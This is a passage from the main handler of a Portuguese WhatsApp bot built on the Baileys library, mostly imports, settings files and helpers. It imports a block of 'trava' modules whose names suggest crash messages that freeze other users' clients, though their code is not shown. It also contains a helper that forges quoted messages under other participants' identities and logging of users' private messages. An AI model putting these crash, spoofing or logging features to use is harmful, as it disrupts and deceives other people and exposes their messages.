//=============‚â†‚â†==========‚â†‚â†=============\\

//[AKAME-BOT_OFC] MELHOR BOT DA WEB\\
//1- N√ÉO KIBAR N√ÉO SHEREK 
//2- CR√âDITOS @YURI MODZ 
//3- BASE DO BOT MANUELA 
//MODIFICA√á√ïES[BY:YURI MODZ]\\

//=============‚â†‚â†==========‚â†‚â†=============\\


require("./dono/config")

const {
 BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
downloadContentFromMessage, 
delay,
useSingleFileAuthState, 
generateWAMessageFromContent, 
WAContextInfo,
proto, 
generateWAMessageContent, 
WAProto, 
generateWAMessage, 
prepareWAMessageMedia, 
areJidsSameUser, 
getContentType, 
WAFlag 
} = require('@adiwajshing/baileys')


const zmans = require("@adiwajshing/baileys")
const uber = require('uberduck-api')
const fs = require('fs')
const yts = require('yt-search');
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const ffmpeg = require('fluent-ffmpeg');
const ytmp4 = require('./modulos/ytmp4')
const { guxtakkkj } = require('./modulos/flip-guxta')
const { Youtube } = require('ytdownloader.js')

const welcome_group = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/welcomegp.json'));

const bye_group = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/byegp.json'));

const welcome_group2 = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/welcomegp2.json'));

const bye_group2 = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/byegp2.json'));

const { mediafire } = require('./fun√ß√µes de cmd/fun√ß√µes/mediafire')

const {  imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./fun√ß√µes/exif') 

const { pornok, hentai } = require('./fun√ß√µes de cmd/fun√ß√µes/scraper')

const webp_mp4 = require("./fun√ß√µes de cmd/fun√ß√µes/webp_mp4.js");

const { validmove, setGame } = require('./fun√ß√µes de cmd/tictactoe');

const muted = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/muted.json'))

const execute = util.promisify(require('child_process').exec)

const { pinterest } = require("./fun√ß√µes de cmd/fun√ß√µes/pinterest")

const { wallpaper } = require("./fun√ß√µes de cmd/fun√ß√µes/wallpaper")

const sotoy = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/sotoy.json'));

const autoreact = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/autoreact.json'))

const { palavrasANA } = require('./fun√ß√µes de cmd/fun√ß√µes/jogos.js');

const { infobemvindo } = require('./fun√ß√µes de cmd/fun√ß√µes/infobv.js');

const welkom = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/welkom.json'));

const welkom3 = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/vacilo3.json'));

const { TelegraPh } = require("./fun√ß√µes/uploader");

const thiccysapi = require('textmaker-thiccy');


//=====================================
const xfar = require('xfarr-api');
const path = require('path')
const fetch = require('node-fetch')
const os = require('os')
 const { TiktokDownloader } = require('./fun√ß√µes/tiktokdl') 
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const hx = require('./fun√ß√µes/hxz-api')
const { TiktokDownloaderr } = require('./fun√ß√µes/tiktokmikudl');
const stalker = require("xzons-api")
const hxz = require('./fun√ß√µes/hxz-api')
const { Aki } = require('aki-api')
const { insert, response } = require('./fun√ß√µes de cmd/fun√ß√µes/simi.js');
const { addComandosId, deleteComandos, getComandoBlock, getComandos, addComandos } =  require('./fun√ß√µes de cmd/fun√ß√µes/addcmd.js');
const { state, saveState } = useSingleFileAuthState('./conex√£o akame.json')
//=====================================
const welkom2 = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/welkom2.json'));

const { detikNews } = require('./fun√ß√µes/detik')
const { color, bgcolor } = require('./fun√ß√µes/color')
const { convertSticker } = require("./fun√ß√µes de cmd/fun√ß√µes/swm.js");
const tamat = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/tamat.json'))

const countMessage = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/countmsg.json'));

const { conselhob } = require('./fun√ß√µes de cmd/fun√ß√µes/conselhob.js');

const { palavras } = require('./fun√ß√µes de cmd/fun√ß√µes/conselhos.js');

const { mediafireDl } = require('./fun√ß√µes/mediafire')

const { eununca } = require('./fun√ß√µes de cmd/fun√ß√µes/eununca.js');

//=====================================

const adeuscara = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/adeuscara.json'));

const { menu } = require("./fun√ß√µes de cmd/menu/menu.js")

const { menudono } = require("./fun√ß√µes de cmd/menu/menudono.js")

const { menulogos } = require('./fun√ß√µes de cmd/menu/menulogos.js');

const { infodono } = require('./fun√ß√µes de cmd/menu/infodono.js');

const { menuadm } = require("./fun√ß√µes de cmd/menu/menuadm.js")

const { menutravas } = require("./fun√ß√µes de cmd/menu/menutravas")

const { menupuxadas } = require("./fun√ß√µes de cmd/menu/menupuxadas")

const { figurinhas } = require("./fun√ß√µes de cmd/menu/figurinhas.js")

const { menuotaku } = require("./fun√ß√µes de cmd/menu/menuotaku.js")

const { menu18 } = require("./fun√ß√µes de cmd/menu/menu18.js")

const { downloads } = require("./fun√ß√µes de cmd/menu/downloads.js")

const { alteradores } = require("./fun√ß√µes de cmd/menu/alteradores")

const { menuprem } = require("./fun√ß√µes de cmd/menu/menuprem.js")

const { brincadeiras } = require("./fun√ß√µes de cmd/menu/brincadeiras.js")

//=====================================

const { EmojiAPI } = require("emoji-api")
const imgbbUploader = require('imgbb-uploader')
const { isLimit,  getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./fun√ß√µes/limit.js');
const emoji = new EmojiAPI()
const usedCommandRecently = new Set()
const { getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, smsg, tanggal, getExtension, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getGroupAdmins,  getRandom } = require('./fun√ß√µes/myfunc')
const { aiovideodl } = require('./fun√ß√µes/scraper.js')
const cheerio = require ("cheerio");
const textpro = require('./fun√ß√µes/textpro')
const mimetype = require('mime-types')
const { segunPRONTOws } = require('./fun√ß√µes/segundo')
const { wikiSearch } = require('./fun√ß√µes/wiki.js');
const premium = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/premium.json'));
const { upload, nit } = require('./fun√ß√µes de cmd/fun√ß√µes/tourl');

const { forwarding, imgnazista, imggay, imgcorno, imggostosa, imggostoso, imgfeio, imgvesgo, imgbebado, imggado, matarcmd, beijocmd, chutecmd, tapacmd } = require("./fun√ß√µes de cmd/nescessario.json")

//=====================================

const ms = require('ms')
 let { covid } = require('./fun√ß√µes/covid.js') 
const { yta,  ytv, searchResult  } = require('./fun√ß√µes/ytdl')
 
const forca = JSON.parse(fs.readFileSync('./fun√ß√µes/database/forca.json'))
const puppet = JSON.parse(fs.readFileSync('./fun√ß√µes/database/puppet_forca.json'))

//===================================== 
 
sph = "„Åç‚Éüüåπ"

fake = "üö© MANUELA-BOT ü©∏"

lolkey = global.lolhuman

keyapi = "key-m"

tohkapi = "AquaSola"

//===================================== 
 
var prefix = global.prefix 

NomeDoBot = global.NomeDoBot

numerodn = global.numerodonoa  

NickDono = global.NickDono

banChats = global.banChats 

logo = global.log0

//===================================== 

const vcard = 'BEGIN:VCARD\n' 
    + 'VERSION:3.0\n' 
    + 'N:;Hya.;;;'
    + 'FN:Hya.\n' 
    + 'ORG:ùêòùêÆùê´ùê¢ ùêåùê®ùêùùê≥ ùêèùê´ùê®ùê†ùê´ùêöùê¶ùêöùêùùê®ùê´;\n'
    + 'TEL;type=CELL;type=VOICE;waid=556593065507:+55 65 93065507\n'
    + 'END:VCARD'

//===================================== 

let picaks = ['flamejante','flaming','flarun','flasmurf']
let picak = picaks[Math.floor(Math.random() * picaks.length)]

const meupirul = ['Hoje', 'Amanh√£', 'Nunca', 'dia', 'semana', 'm√™s', 'ano']
const meupirul2 = ['dias', 'semanas', 'meses', 'anos']

//========CONST=============\\

const nsfw = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/nsfw.json'));

const samih = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/simi.json'));

const samih2 = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/simi.json'));

const akinator = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/akinator.json'))

let bancht = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/banchat.json'));

let limit = JSON.parse(fs.readFileSync('./jogos-rpg/user/limit.json'));

let leveling = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/leveling.json'))

let autosticker = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/autosticker.json'));

const autostick = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/autostickpc.json'))

let _level = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/fun√ß√µes/level.json'))

const joguinhodavelhajs = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha.json'));

const joguinhodavelhajs2 = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha2.json'));

const request = require('request');

//===========TRAVAS=============\\

const { travavideo } = require('./src/travavideo.js');
const { porra } = require('./src/porra')
const { lugia } = require('./src/lugia')
const { txt } = require ('./src/txt.js')
const { funeral } = require('./src/funeral')
const { murian } = require('./src/murian')
const { pv3 } = require('./src/pv3')
 const { loc } = require('./src/loc')
 const { judeu } = require('./src/judeu')
 const { explosion } = require('./src/explosion')
 const { jamaicano } = require('./src/jamaicano')
 const { listbug } = require('./src/listbug.js');
 const { malvadinha } = require('./src/malvadinha')
 const { spanking } = require('./src/spanking')
 const { cova } = require('./src/cova')
 const { killed } = require('./src/killed')
 const { sumiu } = require('./src/sumiu')
 const { carrinho } = require('./src/carrinho')
 const { carrinhodesc } = require('./src/carrinhodesc')
 const { carrinhofake } = require('./src/carrinhofake')
 const { catalogo } = require('./src/catalogo')
 const { catalogodesc } = require('./src/catalogodesc')
 const { convite } = require('./src/convite')
 const { doc } = require('./src/doc')
 const { pdf } = require('./src/pdf')
 const { pdfkill } = require('./src/pdfkill')
 const { telapreta } = require('./src/telapreta')
 const { pdff } = require('./src/pdff')
 const { ngazap } = require('./src/ngazap')
 const { buttonkal } = require('./src/travas/buttonkal.js')
 const { azrarel } = require('./src/travas/azrarel.js')
 const { home } = require('./src/travas/home.js')
 const { travaloc } = require('./src/travas/travaloc.js')
 
//============= DESTRAVA ================\\
 
const { destrava } = require('./src/destrava')
const { destrava2 } = require('./src/destrava2')
const { destrava3 } = require('./src/destrava3')
const { destrava4 } = require('./src/destrava4')
const { destrava5 } = require('./src/destrava5')
const { destrava6 } = require('./src/destrava6')
const { destrava7 } = require('./src/destrava7')
const { destrava8 } = require('./src/destrava8')
const { destrava9 } = require('./src/destrava9')
const { destrava10 } = require('./src/destrava10')
const { destrava11 } = require('./src/destrava11')
const { destrava12 } = require('./src/destrava12')
const { destrava13 } = require('./src/destrava13')
 
 //========================================\\
 
const reSize = async(buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

const Jimp = require('jimp')

//========COME√áO ANTIS=============\\


const limitefll = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/flood.json'));

const anticall = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/anticall.json'));

const antifake = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antifake.json'))

const antilinkhard = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antilinkhard.json'))

const autofigu = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/autofigu.json'))

const antilinkgp = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antilinkgp.json'))

const antiporn = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antiporn.json'))

const antiimg = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antiimg.json'))

const antiflood = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/antiflood.json'));

const antisticker = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antisticker.json'))

const antinotas = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antinotas.json'))

const antictt = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antictt.json'))

const anticatalogo = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/anticatalogo.json'))

const antidoc = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antidoc.json'))

const antiloc = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antiloc.json'))

const antipv = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/usuarios/antipv.json'))

const antivid = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antivideo.json'))

const antiaudio = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/antis/antiaudio.json'))

const palavra = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/palavras.json'))

const palavrao = JSON.parse(fs.readFileSync('./fun√ß√µes de cmd/grupos/palavrao.json'))



//========COME√áO=============\\

module.exports = pl = async (pl, m, messages, store) => {
try {
const info = messages ? messages[0]: messages[1]
if (!info.message) return 
if (info.key && info.key.remoteJid == 'status@broadcast') return
const altpdf = Object.keys(info.message)
const type = Object.keys(info.message)[0] == 'senderKeyDistributionMessage' ? Object.keys(info.message)[2] : (Object.keys(info.message)[0] == 'messageContextInfo') ? Object.keys(info.message)[1] : Object.keys(info.message)[0]
bady = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (info.message.listResponseMessage && info.message.listResponseMessage.singleSelectReply.selectedRowId) ? info.message.listResponseMessage.singleSelectReply.selectedRowId: ''
bidy =  bady.toLowerCase()
const programador = '556593065507@s.whatsapp.net'
const programador2 = '559185470410@s.whatsapp.net'
budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''
var budy2 = budy.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");
const nmrdn = [ ...global.numerodonoa].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const numerodono = [`${global.numerodonoa}@s.whatsapp.net`, `${programador}`,`${programador2}`]
const SoDono = numerodono.includes(m.sender)
var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (info.message.buttonsResponseMessage?.selectedButtonId || info.message.listResponseMessage?.singleSelectReply.selectedRowId || info.text) : '' 
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null
//======================================\\


var pes = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : ''

//===========(ID DAS FIGUS)===========\\

const figura = Object.keys(m.message)[0] == "stickerMessage" ? m.message.stickerMessage.fileSha256.toString('base64') : ""

//=====================================\\

const listmsg = (from, title, desc, list) => { 
po = pl.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Escolha aqui","footerText": "Selecione","listType": 1,"sections": list}}, {})
return pl.relayWAMessage(po, {waitForAck: true})
}
listmes = (type == 'listResponseMessage') ? info.message.listResponseMessage.title : ''



//========FORMA√á√ïES/CONST)=============\\

const botNumber = pl.user.id.split(':')[0]+'@s.whatsapp.net'

const itsMe = m.sender == botNumber ? true : false

const text = args.join(" ")

const from = m.key.remoteJid
const isGroup = from.endsWith('@g.us') 
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''


//========GRUPOS/CONST)=============\\

const groupMetadata = isGroup ? await pl.groupMetadata(from) : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupName = isGroup ? groupMetadata.subject : ''
const sender = isGroup ? m.key.participant : m.key.remoteJid
const pushname = m.pushName ? m.pushName : ''

const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()

const arg = body.substring(body.indexOf(' ') + 1)


const argss = body.split(/ +/g)
const testat = body
const ants = body

const groupDesc = isGroup ? groupMetadata.desc : ''

const groupMembers = isGroup ? groupMetadata.participants : ''

const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

//=======================================\\


//============(SORTEIO-CONST)============\\

const isSimi = isGroup ? samih.includes(from) : false

const isSimi2 = isGroup ? samih2.includes(from) : false


//=======(ADMS/DONO/ETC..CONST)========\\

const isNsfw =  isGroup ? nsfw.includes(from) : true

const isBot = m.key.fromMe ? true : false

const isPremium = premium.includes(sender)

const isBotAdmins = groupAdmins.includes(botNumber) || false

const isGroupAdmins = groupAdmins.includes(sender) || false 

const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

//==============================

const welcm = isGroup ? wlcm.includes(from) : true
const GcRvk = isGroup ? gcrevoke.includes(from) : false
const isLevelingOn = isGroup ? leveling.includes(from) : false
const isAutoStick = autostick.includes(from)
const isAutoSticker = isGroup ? autosticker.includes(from) : false

const content = JSON.stringify(m.message)

//================COME√áO DOS ANTIS======================\\

//===========(ANTIS-PROTE√á√ïES)===========\\

const isAntifake = isGroup ? antifake.includes(from) : false

const isAntiCtt = isGroup ? antictt.includes(from) : false

const isAnticatalogo = isGroup ? anticatalogo.includes(from) : false

const isAntiFlood = isGroup ? antiflood.includes(from) : false	

const isAntiLinkHard = isGroup ? antilinkhard.includes(from) : false

const isJoguin = isGroup ? joguinhodavelhajs.includes(sender) : false

const isAntilinkgp = isGroup ? antilinkgp.includes(from) : false

const isAntiPorn = isGroup ? antiporn.includes(from) : false

const isAntiAudio = isGroup ? antiaudio.includes(from) : false	
	
const isAntiImg = isGroup ? antiimg.includes(from) : false

const isAntiSticker = isGroup ? antisticker.includes(from) : false

const isAntiNotas = isGroup ? antinotas.includes(from) : false

const Antidoc = isGroup ? antidoc.includes(from) : false

const Antiloc = isGroup ? antiloc.includes(from) : false

const isAntiVid = isGroup ? antivid.includes(from) : false	

const isAutoReact = isGroup ? autoreact.includes(from) : false

const isWelkom2 = isGroup ? welkom2.includes(from) : false

const isWelkom3 = isGroup ? welkom3.includes(from) : true

const groupIdWelcomed2 = []	

for(let obj of welcome_group2) groupIdWelcomed2.push(obj.id)

const groupIdBye2 = []

for(let obj of bye_group2) groupIdBye2.push(obj.id)


const isWelcomed2 = (groupIdWelcomed2.indexOf(from) >= 0) ? true : false

const isByed2 = (groupIdBye2.indexOf(from) >= 0) ? true : false	
	

const isAntiPv = (antipv.indexOf('Ativado') >= 0) ? true : false	

const isAnticall = (anticall.indexOf('Ativado') >= 0) ? true : false

const isPalavrao = isGroup ? palavrao.includes(from) : false	

const isViewOnce = (type == 'viewOnceMessage')

const isWelkom = isGroup ? welkom.includes(from) : false

const isBanchat = isGroup ? bancht.includes(from) : false	

//=======================================\\
 

//=========(isQuoted/consts)=============\\
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
             
//==========================================\\

selectedButton = (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''

//==========================================\\


  const argsButton = selectedButton.trim().split(/ +/)

//==========================================\\

const getFileBuffer = async (mediakey, MediaType) => {
  
const stream = await downloadContentFromMessage(mediakey, MediaType)



let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

 try {
ppimg = await pl.profilePictureUrl(sender)
 } catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 }
const userppbuff = await getBuffer(ppimg) 


const sendSticker = (from, filename, m) => {
pl.sendMessage(from, {sticker: filename}, {quoted: m})
}

const sendImage = (ytb) => {
pl.sendMessage(from, {image: ytb}, {quoted:m})
}


const sendMess = (hehe, ytb) => {
pl.sendMessage(hehe, {text: ytb})
}

	const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? pl.sendMessage(from, {text: teks.trim(), mentions: memberr}) : pl.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
	
const costum = (pesan, tipe, target, target2) => {
pl.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
}

const sendlistA = async (id, txt1, txt2, title1, btext, but) => {

const sections = but

const listMessage = {
text: txt1,
footer: txt2,
title: title1,
buttonText: btext,
sections
}
pl.sendMessage(id, listMessage)  
}


//=========HORAS=============

function kyun(seconds){
function pad(s){
return (s < 10 ? '0' : '') + s;
}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);
return `${pad(hours)} HORAS ${pad(minutes)} MINUTOS ${pad(seconds)} SEGUNDOS`
}



const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00"){
var tempo = 'BOA MADRUGADA' 
} 
if(time2 > "05:30:00"){
var tempo = 'BOM DIA' 
}
if(time2 > "12:00:00"){
var tempo = 'BOA TARDE' 
}
if(time2 > "19:00:00"){
var tempo = 'BOA NOITE' 
}



//========REPLY========================
/*
var selo = {
    key: {
fromMe: false,
"participant": "0@s.whatsapp.net",
"remoteJid": "120363022697760691@g.us"
    },
    "message": {
orderMessage: {
itemCount: -9999999,
status: 200,
jpegThumbnail: fs.readFileSync('./m√≠dia-ft-vd/fotos/verificado.png'),
surface: 200,
message: `${NomeDoBot}\nComando: ${prefix + command}`,
orderTitle: 'Venda de drogas',
sellerJid: '0@s.whatsapp.net'
}
    },
    contextInfo: {
"forwardingScore": 999,
"isForwarded": true
    },
    sendEphemeral: true
}

*/

var selo = {"key": {"fromMe": false,"participant":"0@s.whatsapp.net", "remoteJid": "557598293339@g.us" }, "message": {orderMessage: {itemCount: -9999,status: 4, thumbnail: fs.readFileSync(`./m√≠dia-ft-vd/fotos/verificado.png`) ,message: `Ol√°, ${pushname}\nCriador: @YuriArceu`,surface: 100, sellerJid: "0@s.whatsapp.net"}}}


const fotothumb = {text: 'oi', sendEphemeral: true,"externalAdReply": {"title": `üí¶ Ol√°, Humano ${pushname}`,"body":`üí¶Siga Meu Criador: @Licht.offc`,"previewType": "PHOTO","thumbnailUrl": "","thumbnail": fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg'),"sourceUrl": `oi https://api.whatsapp.com/send?phone=${global.numerodonoa}&text=*opa*%20${NickDono}%20*vim*%20*pela*:${NomeDoBot}`},mentionedJid:[sender]
}

const reply = (texto) => {
pl.sendMessage(from, { text: texto }, {quoted: m})
}

//=====================================

//=====================================
     
pl.createMessage = async (jidnya, kontennya, optionnya) => {
return await generateWAMessage(jidnya, kontennya, {...optionnya,userJid: pl.authState.creds.me.id,upload: pl.waUploadToServer})
}

//=====================================


function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}


//=============DATA=============

const date = moment.tz('America/Sao_Paulo').format('DD/MM/YY');


const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const dataa = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

//=====================================


//=====================================


// ‚ùóùô≤ùôæùôºùô∞ùôΩùô≥ùôæ ùôΩùôæ ùôøùöÖ‚ùó
if (!isGroup && isCmd) console.log(
color('‚ï≠‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚™©','white'),'\n',
color('‚ï∞‚ïÆ„Åç‚Éü‚ùó COMANDO NO PV ‚ùó ‚Éü „Åç','red'),'\n',
color('‚ï≠‚î§','red'),'\n',
color('‚îÉ‚îÇ‚û•  N√öMERO :','red'),color(sender.split("@")[0],'blue'),'\n',
color('‚îÉ‚îÇ‚û•  C–úD :','red'),color(command,'cyan'),'\n',
color('‚îÉ‚îÇ‚û•  HORA :','red'),color(hora,'cyan'),'\n',
color('‚îÉ‚îÇ‚û•  DA–¢A :','red'),color(dataa,'cyan'),'\n'),
color('‚îÉ‚ï∞‚ïê‚ïê ‚™®','red'),'\n',
color('‚ï∞‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚™®','red'),'\n'

// ‚ùóùôºùô¥ùôΩùöÇùô∞ùô∂ùô¥ùôº ùôΩùôæ ùôøùöÖ‚ùó
if (!isCmd && !isGroup && !info.key.fromMe) console.log(
color('„Ää‚ùóMENSAGEM PRIVADO‚ùó„Äã','white'),'\n',
color('‚Ä£ N√öMERO :','red'),color(sender.split("@")[0],'blue'),'\n',
color('‚Ä£ NICK :','red'),color(pushname,'cyan'),'\n',
color('‚Ä£ HORA :','red'),color(hora,'cyan'),'\n',
color('‚Ä£ DATA :','red'),color(dataa,'cyan'),'\n')

// ‚ùóùô≤ùôæùôºùô∞ùôΩùô≥ùôæ ùô¥ùôº ùô∂ùöÅùöÑùôøùôæ‚ùó
if (isCmd && isGroup) console.log(
color('„Ää‚ùóCO–úANDO NO GRUPO‚ùó„Äã','white'),'\n',
color('‚Ä£ GRUPO :','red'),color(groupName,'yellow'),'\n',
color('‚Ä£ N√öMERO :','red'),color(sender.split("@")[0],'red'),'\n',
color('‚Ä£ NICK :','red'),color(pushname,'cyan'),'\n',
color('‚Ä£ CMD :','red'),color(command,'cyan'),'\n',
color('‚Ä£ HORA :','red'),color(hora,'cyan'),'\n',
color('‚Ä£ DATA :','red'),color(dataa,'cyan'),'\n')

// ‚ùóùôºùô¥ùôΩùöÇùô∞ùô∂ùô¥ùôº ùô¥ùôº ùô∂ùöÅùöÑùôøùôæ‚ùó
if (!isCmd && isGroup && !info.key.fromMe) console.log(
color('„Ää‚ùóMENSAGEM NO GRUPO ‚ùó„Äã','white'),'\n',
color('‚Ä£ GRUPO :','red'),color(groupName,'cyan'),'\n',
color('‚Ä£ N√öMERO :','red'),color(sender.split("@")[0],'red'),'\n',
color('‚Ä£ NICK :','red'),color(pushname,'cyan'),'\n',
color('‚Ä£ HORA :','red'),color(hora,'cyan'),'\n',
color('‚Ä£ DATA :','red'),color(dataa,'cyan'),'\n')

		
  if (/document/i.test(type)) console.log(`üóÇÔ∏è ${m.msg.fileName || m.msg.displayName || 'Document'}`)
  else if (/ContactsArray/i.test(type)) console.log(`üë®‚Äçüë©‚Äçüëß‚Äçüë¶ ${' ' || ''}`)
  else if (/contact/i.test(type)) console.log(`üë® ${m.msg.displayName || ''}`)
  else if (/audio/i.test(type)) {
    const duration = m.msg.seconds
    console.log(`${m.msg.ptt ? 'üé§ MENSAGEM DE VOZ' : 'üéµ AUDIO'} ${Math.floor(duration / 60).toString().padStart(2, 0)}:${(duration % 60).toString().padStart(2, 0)}`)
  }


 
//===================================== 



//=====================================


//===========(enviar.espere)=============\\

const { mensagens } = require('./fun√ß√µes de cmd/fun√ß√µes/aleatoria.js');

const { sortear } = require('./fun√ß√µes de cmd/fun√ß√µes/aleatoria.js');

var enviarmen = mensagens[Math.floor(Math.random() * mensagens.length)] 
//========================================\\


//=====================================

enviar = {
espere: `${enviarmen}`,
successo: 'Ô∏è‚ù¨ ‚úî ‚ù≠ Sucesso üñ§',
levelon: '‚ù¨ ‚úî ‚ù≠ *leveling* *ativado*',
